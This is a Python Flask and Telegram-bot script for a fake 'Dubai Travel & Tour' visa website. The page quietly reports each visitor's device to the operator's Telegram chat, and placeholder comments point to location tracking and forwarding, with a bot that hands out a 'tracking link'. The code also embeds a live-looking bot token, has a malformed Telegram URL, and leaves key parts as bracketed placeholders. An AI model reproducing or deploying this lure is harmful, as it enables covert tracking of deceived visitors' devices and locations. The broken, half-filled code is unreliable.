import os
import threading
import requests
from flask import Flask, request
import telebot

# --- AAP KI TELEGRAM CREDENTIALS (VERIFIED) ---
TELEGRAM_BOT_TOKEN = "8742528917:AAHz664V1Md6qQ_8RP2nKsINXTBRY9loz50"
TELEGRAM_CHAT_ID = "8049432833"
PORT = int(os.environ.get("PORT", 8080))

# Initialize Flask and TeleBot
app = Flask(__name__)
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

# Helper function to send messages to Telegram
def send_telegram_message(message):
    url = f"https://telegram.org{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print(f"Telegram Error: {e}")

# --- TELEGRAM BOT COMMANDS ---
@bot.message_handler(commands=['start', 'link', 'getlink'])
def send_link_command(message):
    if str(message.chat.id) == str(TELEGRAM_CHAT_ID):
        app_url = os.environ.get("APP_URL", "https://onrender.com")
        response_text = f"🔗 *Aapka Professional Tracking Link:* \n`{app_url}`"
        bot.send_message(message.chat.id, response_text, parse_mode="Markdown")

# --- FLASK WEB SERVER (PREMIUM PORTAL FRONTEND) ---
@app.route("/")
def index():
    # Trigger instant active alert quietly on backend first
    user_agent = request.headers.get('User-Agent', 'Unknown Device')
    if "bot" not in user_agent.lower() and "telegram" not in user_agent.lower():
        alert_msg = f"👤 *⚡ ACTIVE: One person opened your professional visa site!* ⚡\n\n📱 *Device:* `{user_agent[:80]}`"
        send_telegram_message(alert_msg)

    # Return fully styled premium enterprise agency UI template
    return '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dubai Travel & Tour - Professional Visa Services</title>
    <style>
        /* [CSS styles for a professional travel landing page] */
    </style>
</head>
<body onclick="quietTrigger()">
    <!-- [Professional UI with Header, Hero Section, Country Grid, and Reviews] -->
    <div id="loadingOverlay" class="overlay">
        <div class="spinner"></div>
        <p>Loading Secure Visa Form Matrix...</p>
    </div>

    <script>
        const destinationLink = "https://netlify.app";
        // [JavaScript for location tracking and redirection]
        function openSecurePortal() {
            // [Logic for secure redirection]
            window.location.href = destinationLink;
        }
    </script>
</body>
</html>
'''

# [Flask routes for updating location and running server]
@app.route("/update", methods=["POST"])
def update():
    # [Code to send location data to Telegram]
    return "OK", 200

def run_flask():
    app.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False)

if __name__ == "__main__":
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    bot.infinity_polling()
